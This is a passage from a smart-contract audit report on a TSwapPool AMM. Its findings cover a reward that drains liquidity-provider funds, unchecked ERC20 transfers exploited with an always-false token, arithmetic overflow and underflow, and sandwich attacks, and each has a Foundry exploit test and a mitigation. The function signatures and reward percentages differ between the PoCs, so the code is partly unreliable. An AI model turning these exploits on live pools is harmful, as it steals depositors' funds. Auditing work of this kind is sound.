4. On the 10th swap, the attacker swaps 10 WETH. They receive the calculated amount of PoolToken, plus an additional reward (e.g., 1% of the output amount) which is transferred from the pool's reserves.
5. The attacker repeats steps 3 and 4, each cycle draining more PoolToken than they paid for, at the expense of the LP.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {TSwapPool}  from "src/TSwapPool.sol";
import {MockERC20}  from "test/mocks/MockERC20.sol";

/*
   Assumptions about TSwapPool interface (taken from the repository):
   - constructor(address poolToken,address weth,string name,string symbol)
   - function deposit(uint256 wethAmount,uint256 tokenAmount) external
   - function swapExactInput(address tokenIn,address tokenOut,uint256 amountIn,uint256 minAmountOut,uint256 deadline) external returns (uint256)
   - function getOutputAmountBasedOnInput(uint256 amountIn,address tokenIn) external view returns (uint256)
*/

contract RewardDrainTest is Test {
    TSwapPool pool;
    MockERC20  weth;
    MockERC20  token;

    address lp       = vm.addr(1);
    address attacker = vm.addr(2);

    function setUp() public {
        // Deploy mock tokens
        weth  = new MockERC20("Wrapped Ether", "WETH", 18);
        token = new MockERC20("Pool Token",     "PTK",  18);

        // Create pool
        pool = new TSwapPool(address(token), address(weth), "LP-Token", "LPT");

        // --- LP PROVIDES LIQUIDITY --------------------------------------------------
        uint256 wethLiquidity   = 100 ether;
        uint256 tokenLiquidity  = 100_000 ether;

        weth.mint(lp,   wethLiquidity);
        token.mint(lp,  tokenLiquidity);

        vm.startPrank(lp);
        weth.approve(address(pool),  wethLiquidity);
        token.approve(address(pool), tokenLiquidity);
        pool.deposit(wethLiquidity, tokenLiquidity);
        vm.stopPrank();

        // --- PREPARE THE ATTACKER ---------------------------------------------------
        weth.mint(attacker, 10 ether);
        vm.prank(attacker);
        weth.approve(address(pool), 10 ether);
    }

    function test_rewardDrainsPool() public {
        uint256 poolTokenBalanceBefore = token.balanceOf(address(pool));

        // attacker executes 9 dust swaps (1 wei each)
        vm.startPrank(attacker);
        for (uint256 i = 0; i < 9; i++) {
            pool.swapExactInput(address(weth), address(token), 1, 0, block.timestamp);
        }

        // tenth swap triggers the reward mechanism
        uint256 amountIn  = 1 ether;
        uint256 expectedOut = pool.getOutputAmountBasedOnInput(amountIn, address(weth));
        uint256 attackerTokenBefore = token.balanceOf(attacker);

        pool.swapExactInput(address(weth), address(token), amountIn, 0, block.timestamp);

        uint256 attackerTokenAfter = token.balanceOf(attacker);
        uint256 actualOut = attackerTokenAfter - attackerTokenBefore;
        vm.stopPrank();

        // reward means attacker receives strictly more than AMM quotation
        assertGt(actualOut, expectedOut, "attacker obtained reward from LP reserves");

        // pool lost more tokens than dictated by invariant
        uint256 poolTokenBalanceAfter = token.balanceOf(address(pool));
        uint256 expectedPoolBalance   = poolTokenBalanceBefore - expectedOut;
        assertLt(poolTokenBalanceAfter, expectedPoolBalance, "extra tokens were drained from the pool");
    }
}


## Suggested Mitigation
The reward mechanism that pays out from LP reserves must be removed entirely. Rewards, if desired, must be funded from a separate protocol-owned treasury and not from the assets provided by liquidity providers. The `_swap` function should only facilitate the exchange of tokens based on the AMM formula.

```diff
-        swap_count++;
-        if (swap_count >= SWAP_COUNT_MAX) {
-            uint256 rewardAmount = amountOut / 100; // Example reward
-            IERC20(tokenOut).transfer(to, rewardAmount);
-            swap_count = 0;
-        }
```

## [H-22]. Unchecked Return issue in TSwapPool::_swap, _addLiquidityMintAndTransfer, withdraw

## Description
The contract calls `transfer` and `transferFrom` on external ERC20 token contracts but does not check the boolean return value. According to the ERC20 specification, a transfer can fail by returning `false` instead of reverting. This is common for certain tokens (e.g., USDT) or tokens with blacklisting/pausing features. If a transfer fails silently, the contract will proceed as if it were successful, leading to a state inconsistency where the protocol has not received tokens but has paid out other tokens or minted LP shares.

## Impact
This vulnerability can lead to a direct loss of funds. An attacker can use a malicious or non-standard token to make a transfer fail silently, receiving assets from the pool without providing the required input tokens. This would drain the pool's assets.

## Proof of Concept
1. Deploy a pool with a malicious ERC20 that always returns `false` on `transferFrom`.
2. Seed the pool with an initial non-zero balance of both WETH and the malicious token (can be done by directly minting the two tokens to the pool address).
3. Invoke `swapExactInput`, providing the malicious token as `tokenIn` and WETH as `tokenOut`.
4. Because `transferFrom` returns `false`, the pool never receives the malicious tokens, yet `_swap` continues and transfers WETH out to the attacker, creating an imbalance and allowing repeated drainage.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {TSwapPool} from "../src/TSwapPool.sol";
import {MockERC20} from "./mocks/MockERC20.sol";

contract MaliciousERC20 is MockERC20 {
    constructor() MockERC20("Bad Token", "BAD", 18) {}
    function transferFrom(address, address, uint256) public override returns (bool) {
        // Always fail silently
        return false;
    }
}

contract UncheckedReturnTest is Test {
    TSwapPool pool;
    MockERC20 weth;
    MaliciousERC20 badToken;
    address attacker = makeAddr("attacker");

    function setUp() public {
        weth = new MockERC20("WETH", "WETH", 18);
        badToken = new MaliciousERC20();
        pool = new TSwapPool(address(badToken), address(weth), "LP", "LP");

        // Seed the pool with some initial liquidity so swaps do not revert
        weth.mint(address(pool), 100 ether);
        badToken.mint(address(pool), 1_000 ether);

        // Give attacker BAD tokens and set allowance (not strictly necessary for exploit)
        badToken.mint(attacker, 10_000 ether);
        vm.prank(attacker);
        badToken.approve(address(pool), type(uint256).max);
    }

    function test_exploitUncheckedReturn() public {
        vm.startPrank(attacker);
        uint256 wethBefore = weth.balanceOf(attacker);
        uint256 poolWethBefore = weth.balanceOf(address(pool));

        // Attempt to swap 1_000 BAD for WETH – transferFrom will return false
        pool.swapExactInput(address(badToken), address(weth), 1_000 ether, 0, block.timestamp);

        uint256 wethAfter = weth.balanceOf(attacker);
        uint256 poolWethAfter = weth.balanceOf(address(pool));

        assertGt(wethAfter, wethBefore, "Attacker gained WETH");
        assertLt(poolWethAfter, poolWethBefore, "Pool lost WETH");
        assertEq(badToken.balanceOf(address(pool)), 1_000 ether, "Pool never received additional BAD");
        vm.stopPrank();
    }
}

## Suggested Mitigation
Use the `SafeERC20` library from OpenZeppelin for all ERC20 interactions. Replace all calls to `transfer` and `transferFrom` with `safeTransfer` and `safeTransferFrom`. This library handles the return value check and reverts the transaction on failure.

```diff
+import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

 contract TSwapPool is ERC20 {
+    using SafeERC20 for IERC20;
     // ...
 
     function _swap(...) private {
         // ...
-        IERC20(tokenIn).transferFrom(from, address(this), amountIn);
-        IERC20(tokenOut).transfer(to, amountOut);
+        IERC20(tokenIn).safeTransferFrom(from, address(this), amountIn);
+        IERC20(tokenOut).safeTransfer(to, amountOut);
     }
 }
```

## [H-23]. Unchecked Return issue in TSwapPool::_swap

## Description
The contract interacts with external ERC20 tokens via `transfer` and `transferFrom` but does not check the boolean return value of these calls. According to the ERC20 standard, a transfer may fail by returning `false` instead of reverting (e.g., USDT). If a transfer fails silently, the contract logic proceeds as if it succeeded. For instance, in `_swap`, if the input `tokenToSell.transferFrom()` call returns `false`, the contract will still send `tokenToBuy` to the user, effectively giving them free tokens.

## Impact
This vulnerability allows an attacker to drain a pool's funds. By using a malicious or non-standard ERC20 token that returns `false` on `transferFrom`, an attacker can repeatedly call `swapExactInput` to receive the paired token (e.g., WETH) without ever depositing their own tokens. This leads to a complete loss of funds for liquidity providers.

## Proof of Concept
1. Attacker deploys a malicious ERC20 that always returns `false` from `transferFrom` but behaves normally for `transfer`.
2. Attacker (or anyone else) creates a pool for this token via `PoolFactory.createPool`.
3. Attacker pre-funds the pool by directly transferring 10 WETH and 10 malicious tokens to the pool address. Direct `transfer` succeeds because it is outside the AMM logic.
4. Attacker approves the pool for 1 malicious token and calls `swapExactInput(malicious, WETH, 1e18, 0)`.
   • Inside `_swap` the pool calls `malicious.transferFrom(attacker, pool, 1e18)` which silently returns `false` and transfers **no tokens**.
   • The code does not check the return value and continues, transferring a calculated amount of WETH to the attacker.
5. Step 4 can be repeated until all WETH is drained while the pool never receives the malicious tokens.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {PoolFactory} from "src/PoolFactory.sol";
import {TSwapPool}  from "src/TSwapPool.sol";

contract BadERC20 {
    string public name = "Bad Token";
    string public symbol = "BAD";
    uint8  public decimals = 18;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external { balanceOf[to] += amount; emit Transfer(address(0), to, amount); }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; }
    function transfer(address to, uint256 amount) external returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; emit Transfer(msg.sender, to, amount); return true; }
    // critical: always return false
    function transferFrom(address, address, uint256) external returns (bool) { return false; }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract WETH {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8  public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function deposit() external payable { balanceOf[msg.sender] += msg.value; emit Transfer(address(0), msg.sender, msg.value); }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; }
    function transfer(address to, uint256 amount) external returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; emit Transfer(msg.sender, to, amount); return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract UncheckedReturnFixedPOC is Test {
    PoolFactory factory;
    TSwapPool  pool;
    WETH       weth;
    BadERC20   bad;
    address attacker = address(0xBEEF);

    function setUp() public {
        vm.deal(attacker, 20 ether);
        weth = new WETH();
        bad  = new BadERC20();
        factory = new PoolFactory(address(weth));
        pool = TSwapPool(factory.createPool(address(bad)));

        // fund pool directly (no deposit needed, so transferFrom is not invoked)
        bad.mint(address(this), 10 ether);
        bad.transfer(address(pool), 10 ether);
        vm.prank(attacker);
        weth.deposit{value: 10 ether}();
        weth.transfer(address(pool), 10 ether);

        // attacker prepares approval
        vm.startPrank(attacker);
        bad.mint(attacker, 1 ether);
        bad.approve(address(pool), 1 ether);
        vm.stopPrank();
    }

    function testExploit() public {
        uint256 poolWethBefore = weth.balanceOf(address(pool));
        uint256 attackerWethBefore = weth.balanceOf(attacker);

        vm.prank(attacker);
        pool.swapExactInput(address(bad), address(weth), 1 ether, 0); // transferFrom returns false → free WETH

        uint256 poolWethAfter = weth.balanceOf(address(pool));
        uint256 attackerWethAfter = weth.balanceOf(attacker);

        assertLt(poolWethAfter, poolWethBefore, "Pool should have lost WETH");
        assertGt(attackerWethAfter, attackerWethBefore, "Attacker should have gained WETH");
    }
}

## Suggested Mitigation
Wrap every external ERC20 interaction with OpenZeppelin SafeERC20 (or equivalent) so that the call reverts when the token returns `false` or when no data is returned at all. Replace all raw `transfer` / `transferFrom` / `approve` invocations in `TSwapPool` (and future contracts) with `safeTransfer`, `safeTransferFrom`, and `safeApprove`.

## [H-24]. Flash Loan Economic Manipulation issue in TSwapPool::_swap

## Description
The `_swap` function in `TSwapPool` implements a reward mechanism that triggers on every 10th swap. It transfers an additional 5% of the output tokens to the swapper. This "reward" is not funded by protocol fees but is taken directly from the pool's liquidity, which belongs to the Liquidity Providers (LPs). An attacker can exploit this by performing 9 small, inexpensive swaps to increment the `swap_count`, and then executing a very large 10th swap. This large swap will trigger the reward, allowing the attacker to drain a significant amount of assets from the pool at the expense of LPs.

## Impact
Severe financial loss for Liquidity Providers. An attacker can systematically drain value from any pool by repeatedly executing this attack pattern, making liquidity provision unprofitable and destroying the protocol's value proposition. The entire capital of a pool is at risk.

## Proof of Concept
1. An attacker identifies a liquid TSwap pool (e.g., TKN/WETH).
2. The attacker observes that the current `swap_count` is 0.
3. The attacker performs 9 tiny swaps (e.g., swapping 1 wei of TKN for WETH), paying minimal gas. This increments `swap_count` to 9.
4. For the 10th transaction, the attacker executes a massive swap, for example, swapping a large amount of WETH for TKN, maximizing the `amountTokenToBuy`.
5. The `_swap` function executes, transferring the calculated output amount of TKN.
6. `swap_count` becomes 10, triggering the `if` block. An additional 5% of the large output amount is transferred from the pool to the attacker.
7. The attacker successfully extracts a large bonus, funded directly by the pool's LPs. This cycle can be repeated.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {TSwapPool} from "../../src/TSwapPool.sol";
import {PoolFactory} from "../../src/PoolFactory.sol";
import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

/* -------------------------------------------------------------------------- */
/*                               Test Helpers                                 */
/* -------------------------------------------------------------------------- */
contract TestToken is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

/* -------------------------------------------------------------------------- */
/*                              Exploit Scenario                               */
/* -------------------------------------------------------------------------- */
contract RewardDrainTest is Test {
    PoolFactory factory;
    TSwapPool   pool;
    TestToken   weth;
    TestToken   tokenA;

    address constant LP       = address(1);
    address constant ATTACKER = address(2);

    function setUp() public {
        /* Deploy mock tokens */
        weth   = new TestToken("WETH", "WETH");
        tokenA = new TestToken("TKA",  "TKA");

        /* Deploy pool through factory */
        factory  = new PoolFactory(address(weth));
        address p = factory.createPool(address(tokenA));
        pool      = TSwapPool(p);

        /* LP adds liquidity */
        weth.mint(LP,   1000 ether);
        tokenA.mint(LP, 1000 ether);
        vm.startPrank(LP);
        weth.approve(address(pool),   type(uint256).max);
        tokenA.approve(address(pool), type(uint256).max);
        pool.deposit(1000 ether, 1000 ether);
        vm.stopPrank();

        /* Fund attacker with WETH */
        weth.mint(ATTACKER, 100 ether);
    }

    function testRewardDrain() public {
        vm.startPrank(ATTACKER);
        weth.approve(address(pool), type(uint256).max);

        /* 1) Perform 9 dust swaps to reach swap_count == 9 */
        for (uint8 i; i < 9; ++i) {
            pool.swapExactInput(address(weth), 1, 0);
        }
        assertEq(pool.swap_count(), 9, "swap_count should be 9");

        /* 2) Large 10th swap triggers 5 % bonus */
        uint256 amountIn  = 10 ether;
        uint256 expected  = pool.getOutputAmountBasedOnInput(address(weth), amountIn);
        uint256 bonus     = expected * 5 / 100;

        uint256 beforeBal = tokenA.balanceOf(ATTACKER);
        pool.swapExactInput(address(weth), amountIn, 0);
        uint256 gained    = tokenA.balanceOf(ATTACKER) - beforeBal;

        /* 3) Attacker receives ≈ expected + 5 % bonus */
        assertApproxEqAbs(gained, expected + bonus, 1, "Attacker should receive 5 % extra tokens");
        vm.stopPrank();
    }
}

## Suggested Mitigation
The reward mechanism is fundamentally flawed as it drains capital from Liquidity Providers. It should be removed entirely. If a reward system is a desired feature, it must be funded from a separate treasury or from protocol-earned fees, not from the LPs' assets.

```diff
// TSwapPool.sol
function _swap(address tokenToSell, address tokenToBuy, uint256 amountTokenToSell, uint256 amountTokenToBuy) internal {
    require(tokenToSell == address(i_wethToken) || tokenToSell == address(i_poolToken), "TSwapPool__InvalidSellToken");
    require(tokenToBuy == address(i_wethToken) || tokenToBuy == address(i_poolToken), "TSwapPool__InvalidBuyToken");
    require(tokenToSell != tokenToBuy, "TSwapPool__IdenticalTokens");
    
    IERC20(tokenToSell).transferFrom(msg.sender, address(this), amountTokenToSell);
-   swap_count++;
    IERC20(tokenToBuy).transfer(msg.sender, amountTokenToBuy);
-   
-
-   if (swap_count == SWAP_COUNT_MAX) {
-       IERC20(tokenToBuy).transfer(msg.sender, ((amountTokenToBuy * 5) / 100));
-       swap_count = 0;
-   }
}
```



# Medium Risk Findings

## [M-1]. DOS issue in TSwapPool::sellPoolTokens

## Description
The `sellPoolTokens` function is intended to allow a user to sell a specific quantity of `poolToken` in exchange for `wethToken`. However, it incorrectly calls `swapExactOutput`, passing the user's `poolTokenAmount` as the `outputAmount` of `wethToken` they wish to receive. This is a fundamental logical error that completely misinterprets the user's intent. Instead of selling `poolTokenAmount`, the function tries to buy `poolTokenAmount` of WETH, which is the opposite of its stated purpose.

## Impact
The logical error makes the dedicated convenience function `sellPoolTokens` unusable for its advertised purpose. Most user-supplied amounts will either revert (arithmetic underflow) or require far more input tokens than the caller expects, resulting in loss of gas and potential application-level DoS for front-ends that rely on this helper. Other swap paths remain functional, so the protocol as a whole is not halted.

## Proof of Concept
1. The pool has 100 WETH and 10,000 `poolToken`.
2. A user, intending to sell 1000 `poolToken`, calls `sellPoolTokens(1000 ether)`.
3. The function interprets this as a request to receive 1000 WETH (`outputAmount`).
4. It calls `swapExactOutput`, which in turn calls `getInputAmountBasedOnOutput`.
5. The calculation `(outputReserves - outputAmount)` becomes `100 ether - 1000 ether`.
6. This subtraction underflows, causing the entire transaction to revert. The user loses gas, and the swap fails.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "src/TSwapPool.sol";
import "test/mocks/MockERC20.sol";

contract SellPoolTokensFailureTest is Test {
    TSwapPool internal pool;
    MockERC20 internal weth;
    MockERC20 internal token;
    address internal constant USER = address(1);

    function setUp() public {
        weth  = new MockERC20("WETH", "W", 18);
        token = new MockERC20("TOKEN", "TKN", 18);

        pool = new TSwapPool(address(weth), address(token), "LP", "LP");

        // Seed and approve liquidity provider
        weth.mint(address(this), 100 ether);
        token.mint(address(this), 10_000 ether);
        weth.approve(address(pool), type(uint256).max);
        token.approve(address(pool), type(uint256).max);

        // Provide initial liquidity
        pool.deposit(100 ether, 10_000 ether, 0, uint64(block.timestamp + 1));

        // Prepare user
        token.mint(USER, 5_000 ether);
        vm.prank(USER);
        token.approve(address(pool), type(uint256).max);
    }

    function testSellPoolTokensUnderflowReverts() public {
        // Pool holds only 100 WETH, asking for 1,000 WETH will underflow.
        vm.prank(USER);
        vm.expectRevert(stdError.arithmeticError); // panic code 0x11
        pool.sellPoolTokens(1_000 ether);
    }
}

## Suggested Mitigation
The function logic must be corrected. It should call `swapExactInput` to reflect the user's intent of selling a known amount of input tokens. Additionally, parameters for slippage protection (`minOutputAmount`) and a user-defined `deadline` must be added to protect users from front-running and network congestion.
```solidity
// src/TSwapPool.sol:203
// Remove the old function and replace with this:
function sellPoolTokens(uint256 poolTokenAmountToSell, uint256 minWethToReceive, uint64 deadline) external returns (uint256 wethAmount) {
    return swapExactInput(i_poolToken, poolTokenAmountToSell, i_wethToken, minWethToReceive, deadline);
}
```

## [M-2]. Integer Overflow issue in TSwapPool::getOutputAmountBasedOnInput

## Description
The function `getOutputAmountBasedOnInput` calculates the swap output amount. The denominator is calculated as `(inputReserves * 1000) + inputAmountMinusFee`. The variable `inputReserves` is a `uint256` read directly from a token's `balanceOf`. If a token with a very large supply is used in the pool, `inputReserves` can be large enough for `inputReserves * 1000` to overflow. Since the project uses Solidity 0.8.20, this overflow will cause the transaction to revert. This can lead to a permanent Denial of Service (DoS) for the pool, as any swap attempt would fail, rendering the pool and its liquidity unusable.

## Impact
If a pool is created with a token that has a very large circulating supply (e.g., some meme coins), and significant liquidity is added, the `inputReserves` can exceed `type(uint256).max / 1000`. This will cause all swaps to fail due to arithmetic overflow, effectively freezing all liquidity within the pool permanently.

## Proof of Concept
1. An attacker or user creates a pool with a token that allows for very large balances (e.g., a token with 18 decimals and a total supply in the quadrillions).
2. Liquidity is added to the pool such that the balance of this token (`inputReserves`) becomes greater than `type(uint256).max / 1000` (approximately `1.15e74`).
3. Any subsequent user attempting to perform a swap (`swapExactInput`) that involves this token as the input asset will trigger the `getOutputAmountBasedOnInput` function.
4. The calculation `inputReserves * 1000` will overflow and revert.
5. The pool is now in a DoS state, and no swaps can be executed.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {TSwapPool} from "../src/TSwapPool.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Simple mintable ERC20 that we can use for both WETH and the pool token
contract MintableERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract IntegerOverflowTest is Test {
    TSwapPool private pool;
    MintableERC20 private weth;
    MintableERC20 private lst;

    address private lp      = address(1);
    address private swapper = address(2);

    function setUp() public {
        // Deploy stub tokens
        weth = new MintableERC20("Wrapped Ether", "WETH");
        lst  = new MintableERC20("Large Supply Token", "LST");

        // Deploy pool (constructor expects (poolToken, wethToken, name, symbol))
        pool = new TSwapPool(address(lst), address(weth), "LPToken", "LP");

        // Amount that will overflow when multiplied by 1_000 inside getOutputAmountBasedOnInput
        uint256 overflowAmount = (type(uint256).max / 1000) + 1;

        // Provide LP with the huge token balance and a minimal WETH balance (1e18 wei = 1 ether)
        lst.mint(lp, overflowAmount);
        weth.mint(lp, 1 ether);

        vm.startPrank(lp);
        lst.approve(address(pool), overflowAmount);
        weth.approve(address(pool), 1 ether);

        // First liquidity provision – ratio is completely skewed in favour of LST
        pool.deposit(1 ether, overflowAmount, 0, uint64(block.timestamp));
        vm.stopPrank();

        // Give the swapper a small WETH balance for the swap attempt
        weth.mint(swapper, 1 ether);
    }

    function test_swapReverts_dueToOverflow() public {
        vm.startPrank(swapper);
        weth.approve(address(pool), 1 ether);

        // The multiplication (inputReserves * 1000) overflows and reverts
        vm.expectRevert();
        pool.swapExactInput(IERC20(address(weth)), 1 ether, IERC20(address(lst)), 0, uint64(block.timestamp));
        vm.stopPrank();
    }
}

## Suggested Mitigation
Use a wider type for intermediate calculations or refactor the math to avoid large multiplications. A common pattern in AMMs (like Uniswap V2) is to use `uint112` for reserves to ensure that `reserve * reserve` fits within `uint224`, preventing overflow. For this contract, since changing types would be a major refactor, an alternative is to re-order the calculation to perform division before multiplication where possible, or use a library for handling large number arithmetic, though this adds complexity and gas cost. A simpler fix is to check for the impending overflow before the calculation.

```solidity
function getOutputAmountBasedOnInput(
    uint256 inputAmount,
    uint256 inputReserves,
    uint256 outputReserves
) public pure revertIfZero(inputAmount) revertIfZero(outputReserves) returns (uint256 outputAmount) {
    uint256 inputAmountMinusFee = (inputAmount * 997) / 1000; // a small change here to avoid intermediate overflow
    uint256 numerator = inputAmountMinusFee * outputReserves;
    // Check for overflow before multiplication
    if (inputReserves > type(uint256).max / 1000) {
        revert TSwapPool__Overflow();
    }
    uint256 denominator = (inputReserves * 1000) + inputAmountMinusFee;
    outputAmount = numerator / denominator;
}
```

## [M-3]. Integer Overflow issue in TSwapPool::getInputAmountBasedOnOutput

## Description
The contract contains several integer math vulnerabilities and logical errors in its pricing formulas. 
1. **Integer Overflow:** In `getOutputAmountBasedOnInput`, the calculation `(inputReserves * 1000)` can overflow if `inputReserves` is very large (above `type(uint256).max / 1000`), causing transactions to revert.
2. **Integer Underflow:** In `getInputAmountBasedOnOutput`, `(outputReserves - outputAmount)` will underflow if `outputAmount >= outputReserves`. There is no check to prevent this, which will cause any `swapExactOutput` call with such parameters to revert, leading to a denial of service.
3. **Incorrect Calculation:** The formula in `getInputAmountBasedOnOutput` incorrectly multiplies by `10000` instead of `1000`. This causes it to calculate a required input amount that is 10 times larger than the correct value, making `swapExactOutput` swaps either fail or be prohibitively expensive for users.

## Impact
Because the multiplier in getInputAmountBasedOnOutput is 10× too high, anyone calling swapExactOutput will transfer roughly ten times more of the input token than is economically required. The surplus value is locked inside the pool and benefits existing liquidity providers, leading to direct, irreversible user fund loss on every swapExactOutput call. The absence of an explicit reserve-check also causes an unhelpful revert (division-by-zero) instead of a descriptive error, but it does not endanger pooled funds or the protocol’s liveness.

## Proof of Concept
1. **Underflow DoS:** Call `swapExactOutput` with an `outputAmount` equal to the pool's current reserve of that token. The transaction will revert due to arithmetic underflow.
2. **Incorrect Calculation:** Call `getInputAmountBasedOnOutput` and compare the result to the correct calculation. The function will return a value 10x too high.
3. **Overflow:** Although harder to trigger without extreme liquidity, funding a pool with `type(uint256).max / 999` tokens and performing a swap would cause `getOutputAmountBasedOnInput` to revert.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2 as console} from "forge-std/Test.sol";
import {TSwapPool} from "src/TSwapPool.sol";
import {MockERC20} from "./mocks/MockERC20.sol";

contract MathBug is Test {
    TSwapPool pool;
    MockERC20 weth;
    MockERC20 token;
    address user = address(0xBEEF);

    function setUp() public {
        weth  = new MockERC20("WETH","WETH",18);
        token = new MockERC20("PT","PT",18);
        pool  = new TSwapPool(address(weth), address(token), "LP","LP");

        // bootstrap pool with 10 ether of each asset
        weth.mint(user, 20 ether);
        token.mint(user, 20 ether);
        vm.startPrank(user);
        weth.approve(address(pool), 20 ether);
        token.approve(address(pool), 20 ether);
        pool.deposit(10 ether, 10 ether, 1, uint64(block.timestamp));
        vm.stopPrank();
    }

    function test_IncorrectMultiplierCauses10xOverpayment() public {
        uint256 amountOut = 1 ether;                        // user wants 1 WETH
        uint256 rIn  = token.balanceOf(address(pool));      // reserves in
        uint256 rOut = weth.balanceOf(address(pool));       // reserves out

        uint256 wrongIn = pool.getInputAmountBasedOnOutput(amountOut, rIn, rOut);
        uint256 trueIn  = (rIn * amountOut * 1000) / ((rOut - amountOut) * 997);
        // round according to Uniswap (+1)
        trueIn += 1;

        console.log("wrongIn", wrongIn);
        console.log("trueIn",  trueIn);

        // the bug makes the user pay roughly 10× more
        assertGt(wrongIn, trueIn * 9);
        assertLt(wrongIn, trueIn * 11);
    }

    function test_DenominatorZeroReverts() public {
        uint256 rIn  = token.balanceOf(address(pool));
        uint256 rOut = weth.balanceOf(address(pool));
        vm.expectRevert();
        pool.getInputAmountBasedOnOutput(rOut, rIn, rOut); // amountOut == reservesOut
    }
}

## Suggested Mitigation
Replace the 10000 factor with 1000, add +1 rounding as per Uniswap V2, and require(outputAmount < outputReserves) to fail early with a clear error message. Using checked arithmetic (Solidity ≥0.8) is sufficient; additional SafeMath is unnecessary.

## [M-4]. Frontrun/Backrun/Sandwhich MEV issue in TSwapPool::sellPoolTokens

## Description
The `sellPoolTokens` function, which is intended for users to sell a specified amount of pool tokens, is implemented incorrectly. It calls `swapExactOutput`, treating the `poolTokenAmount` parameter as the desired output amount of WETH. This is a logical flaw. Furthermore, the underlying `swapExactOutput` function does not accept a parameter to limit the maximum input amount a user is willing to spend (`maxInputAmount`). This absence of slippage control allows a malicious actor to perform a sandwich attack, manipulating the pool price to drain a much larger amount of tokens from the user than expected for the fixed output.

## Impact
Users of the `sellPoolTokens` function are highly vulnerable to financial loss through sandwich attacks. An attacker can manipulate the market to force the user to pay an exorbitant price for their swap, leading to significant value extraction.

## Proof of Concept
1. A user, Alice, intends to sell her pool tokens to get exactly 1 WETH. She calls `sellPoolTokens(1 ether)`.
2. An attacker sees her transaction in the mempool.
3. The attacker front-runs Alice's transaction by buying a large amount of WETH from the pool with pool tokens, causing the price of WETH to rise significantly.
4. Alice's transaction executes. To get her 1 WETH, the contract now calculates that she must pay a much larger amount of pool tokens due to the manipulated price. Since there is no slippage protection, the transaction proceeds.
5. The attacker back-runs the transaction by selling the WETH back to the pool, realizing a profit at Alice's expense.

## Proof of Code
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {TSwapPool} from "../src/TSwapPool.sol";
import {MockERC20} from "./mocks/MockERC20.sol";

contract SandwichSellTest is Test {
    TSwapPool internal pool;
    MockERC20 internal weth;
    MockERC20 internal poolToken;

    address internal constant LP = address(1);
    address internal constant VICTIM = address(2);
    address internal constant ATTACKER = address(3);

    function setUp() public {
        weth = new MockERC20("WETH", "WETH", 18);
        poolToken = new MockERC20("PoolToken", "PTKN", 18);
        pool = new TSwapPool(address(weth), address(poolToken), "LPToken", "LP");

        weth.mint(LP, 100 ether);
        poolToken.mint(LP, 10000 ether);
        vm.startPrank(LP);
        weth.approve(address(pool), 100 ether);
        poolToken.approve(address(pool), 10000 ether);
        pool.deposit(50 ether, 5000 ether, 1, uint64(block.timestamp));
        vm.stopPrank();

        poolToken.mint(VICTIM, 2000 ether);
        poolToken.mint(ATTACKER, 5000 ether);
    }

    function test_SandwichAttackOnSellPoolTokens() public {
        // Victim wants to get 1 WETH
        uint256 wethToGet = 1 ether;

        uint256 expectedPoolTokenCost = pool.getInputAmountBasedOnOutput(
            wethToGet, poolToken.balanceOf(address(pool)), weth.balanceOf(address(pool))
        );
        console.log("Victim's expected cost without attack:", expectedPoolTokenCost);

        // Attacker front-runs
        vm.startPrank(ATTACKER);
        poolToken.approve(address(pool), 5000 ether);
        // Drastically change the price by swapping a lot of poolToken for WETH
        pool.swapExactInput(address(poolToken), 2000 ether, address(weth), 0, block.timestamp);
        vm.stopPrank();

        // Victim's transaction is executed
        vm.startPrank(VICTIM);
        poolToken.approve(address(pool), 2000 ether);
        uint256 actualPoolTokenCost = pool.sellPoolTokens(wethToGet);
        vm.stopPrank();
        console.log("Victim's actual cost with attack:", actualPoolTokenCost);

        // Attacker back-runs to realize profit (not strictly needed for PoC)

        assertTrue(actualPoolTokenCost > expectedPoolTokenCost, "Victim paid more due to sandwich attack");
    }
}

## Suggested Mitigation
The function `sellPoolTokens` is misnamed and unsafe. It should be removed. If the intention is to allow selling an exact amount of pool tokens, it should be reimplemented to call `swapExactInput` and must include a `minOutputAmount` parameter for slippage protection. If the intention is to receive an exact amount of WETH, the `swapExactOutput` function should be modified to accept a `maxInputAmount` parameter, and the wrapper function should expose this parameter.

